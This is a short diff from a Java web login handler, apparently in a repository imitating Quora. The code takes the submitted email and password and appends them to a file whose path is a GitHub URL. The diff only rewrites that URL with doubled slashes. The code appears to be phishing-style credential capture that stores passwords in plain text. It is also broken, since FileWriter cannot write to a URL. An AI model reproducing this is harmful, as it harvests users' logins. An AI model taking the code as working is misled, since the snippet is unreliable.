@@ -14,7 +14,7 @@
 	String str = request.getParameter("email");
 	String pass = request.getParameter("password");
 	 //File creation
-	 String strPath = "https://github.com/pbharathreddy/quora.guithub.io/blob/master/login.txt";
+	 String strPath = "https://github.com//pbharathreddy//quora.guithub.io//blob//master//login.txt";
 	 FileWriter fw = new FileWriter(strPath, true);
 	 //File appending
 	 Writer objWriter = new BufferedWriter(fw);
